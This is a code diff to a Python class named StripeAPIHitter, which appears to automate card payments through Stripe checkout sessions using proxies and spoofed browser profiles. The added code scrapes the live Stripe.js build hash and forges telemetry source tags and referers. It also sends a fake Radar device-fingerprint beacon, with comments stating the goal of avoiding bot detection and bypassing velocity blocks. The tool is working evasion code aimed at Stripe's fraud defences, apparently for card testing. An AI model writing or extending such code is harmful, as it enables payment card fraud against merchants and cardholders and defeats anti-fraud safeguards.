@@ -757,6 +757,30 @@ def extract_intent_details(d):
     return intent_id, client_secret
 
 class StripeAPIHitter:
+    _live_js_hash_cache = None
+
+    @staticmethod
+    def _fetch_live_stripe_js_hash():
+        """Scrape the real Stripe.js build hash from the live CDN script once per session."""
+        if StripeAPIHitter._live_js_hash_cache:
+            return StripeAPIHitter._live_js_hash_cache
+        try:
+            import re as _re_hash
+            resp = cffi_requests.get("https://js.stripe.com/v3/", timeout=8, impersonate="chrome124")
+            if resp.status_code == 200:
+                text = resp.text[:5000]  # hash is in the header chunk
+                # Stripe.js exposes build hash in: e.p="https://js.stripe.com/v3/" or chunkId patterns
+                # Look for fingerprinted asset paths like: fingerprinted/js/<name>-<hash>.js
+                match = _re_hash.search(r'fingerprinted/js/[\w-]+-([a-f0-9]{10,40})\.js', text)
+                if match:
+                    StripeAPIHitter._live_js_hash_cache = match.group(1)[:10]
+                    return StripeAPIHitter._live_js_hash_cache
+        except Exception:
+            pass
+        # Fallback: use a recent known-good hash if scrape fails
+        StripeAPIHitter._live_js_hash_cache = "da394b0aef"
+        return StripeAPIHitter._live_js_hash_cache
+
     def __init__(self, pk_live: str, cs_live: str, proxy_data: Dict, raw_amount: int = None, locked_email: str = None):
         self.pk_live = pk_live
         self.cs_live = cs_live
@@ -791,10 +815,12 @@ class StripeAPIHitter:
             else:
                 landing_url = f"https://checkout.stripe.com/c/pay/{self.cs_live}"
 
+            # Dynamically set src tag based on session type — checkout vs merchant-embedded
+            _tel_src = "js-tokenize-inner-v3" if (is_pi or is_seti) else "checkout-inner-live-v3"
             payload = {
                 "v": 2,
                 "tag": "5.6.8_js_fp",
-                "src": "js-tokenize-inner-v3",
+                "src": _tel_src,
                 "a": {
                     "a": self.pk_live,
                     "b": landing_url,
@@ -818,7 +844,7 @@ class StripeAPIHitter:
                 "content-type": "application/json",
                 "accept": "application/json",
                 "origin": "https://js.stripe.com",
-                "referer": landing_url,
+                "referer": "https://js.stripe.com/",
                 "user-agent": profile['user_agent']
             }
             if "sec-ch-ua" in profile:
@@ -1001,6 +1027,30 @@ class StripeAPIHitter:
                     stripe_tokens = await self.generate_stripe_telemetry(profile, proxies, address, page_url=checkout_page_url, session=_cffi_session)
                     # Return freshly generated tokens so the session-level cache can store them
                     result['_stripe_tokens'] = stripe_tokens
+
+                # Step 0.3: Radar Device Data Beacon (r.stripe.com/0)
+                # Real Stripe.js fires this immediately after m.stripe.com/6 telemetry.
+                # Without it, Radar sees an incomplete device fingerprint session = bot signal.
+                try:
+                    _radar_payload = json.dumps({
+                        "v": "2",
+                        "id": stripe_tokens.get('muid', ''),
+                        "k": self.pk_live,
+                        "t": "muid",
+                        "src": "js"
+                    })
+                    _radar_headers = {
+                        "content-type": "application/json",
+                        "origin": "https://js.stripe.com",
+                        "referer": "https://js.stripe.com/",
+                        "user-agent": profile['user_agent']
+                    }
+                    await loop.run_in_executor(None, lambda: _cffi_session.post(
+                        "https://r.stripe.com/0",
+                        headers=_radar_headers,
+                        data=_radar_payload, timeout=5))
+                except Exception:
+                    pass  # non-fatal — continue even if beacon fails
     
                 # Generate perfectly formatted Idempotency Keys to bypass velocity blocks
                 import uuid
@@ -1010,13 +1060,8 @@ class StripeAPIHitter:
                 # Build dynamic typing/fill duration simulator (time_on_page) to act human
                 timing_ms = random.randint(9000, 24000)
 
-                # Rotate Stripe.js build hash — Stripe CDN rotates these; a stale hash is a bot signal
-                # Format: stripe.js/<hash>; stripe-js-v3/<hash>; checkout
-                _js_hashes = [
-                    "4b7b8d71f8", "9ac6f3e201", "7f13b2c94e", "a5d6c8e401",
-                    "3e1b09f2cc", "c91a4d880b", "d8e3a0b7f5", "b274f5a91d"
-                ]
-                _js_hash = random.choice(_js_hashes)
+                # Scrape real Stripe.js build hash from live CDN — fabricated hashes are instant bot flags
+                _js_hash = StripeAPIHitter._fetch_live_stripe_js_hash()
                 _payment_user_agent = f"stripe.js/{_js_hash}; stripe-js-v3/{_js_hash}; checkout"
                 
                 # Step 1: Tokenize the raw card into a PaymentMethod
